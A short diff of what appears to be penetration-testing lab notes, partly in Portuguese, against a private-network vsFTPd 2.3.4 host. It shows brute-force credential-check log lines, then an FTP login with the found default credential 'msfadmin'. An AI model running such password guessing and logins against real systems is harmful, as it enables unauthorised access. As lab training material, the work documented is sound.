@@ -62,6 +62,13 @@ R & Remote system type is Unix.
 2025-11-30 17:18:05 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: password (3 of 4 complete)
 2025-11-30 17:18:05 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: msfadmin (4 of 4 complete)
 
+
+VALIDANDO ACESSO AO FTP COM A CREDENCIAL VAZADA.
+
+1 └─$ ftp 192.168.56.101
+2 Connected to 192.168.56.101.
+3 220 (vsFTPd 2.3.4)
+4 Name (192.168.56.101:kaliadmin): msfadmin
 5 331 Please specify the password.
 6 Password:
 7 230 Login successful.
